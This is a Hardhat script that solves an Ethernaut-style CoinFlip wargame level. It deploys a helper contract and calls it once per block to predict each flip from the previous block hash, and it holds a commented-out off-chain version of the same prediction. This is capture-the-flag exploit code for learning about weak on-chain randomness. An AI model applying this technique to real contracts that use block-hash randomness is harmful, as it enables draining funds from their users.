import { ethers } from "hardhat";
import { CoinFlip__factory, HelperFlip__factory } from "../typechain-types";

async function main() {
  // This is a coin flipping game where you need to build up
  // your winning streak by guessing the outcome of a coin flip.
  // To complete this level you'll need to use your psychic abilities
  // to guess the correct outcome 10 times in a row.

  let tx; // will have to wait for each tx
  let [deployer] = await ethers.getSigners();
  let contract = "0x37CE1f69E8F5d85e3049BD03B1A0581aEc135E84";
  let coinflip = new CoinFlip__factory(deployer).attach(contract);
  let helper = await new HelperFlip__factory(deployer).deploy(contract);

  let lastBlock = 0;
  while (+(await coinflip.consecutiveWins()) <= 10) {
    let newBlock = await ethers.provider.getBlockNumber();
    // let guess = await getGuess();
    if (lastBlock != newBlock) {
      lastBlock = newBlock;
      tx = await helper.guessForMe({ gasLimit: 100_000 });
      await tx.wait();
      console.log(`consecutiveWins: ${+(await coinflip.consecutiveWins())}`);
      //   tx = await coinflip.flip(guess, { gasLimit: 100_000 });
      //   await tx.wait();
    }
  }
}

// apparently off-chain computation has a lag ://
async function getGuess() {
  let factor =
    57896044618658097711785492504343953926634992332820282019728792003956564819968n;

  // blocks related stuff
  let blockNumber = (await ethers.provider.getBlockNumber()) - 1;
  let { hash } = await ethers.provider.getBlock(blockNumber);
  let blockValue = BigInt(hash);

  console.log(`blockNumber: ${blockNumber}`);
  console.log(`hash: ${hash}`);
  console.log(`blockValue: ${blockValue}`);

  let coinFlip = blockValue / factor;
  console.log(`coinflip: ${coinFlip}`);
  let side = Number(coinFlip) == 1 ? true : false;

  console.log(side);
  console.log("=======================================");
  return side;
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
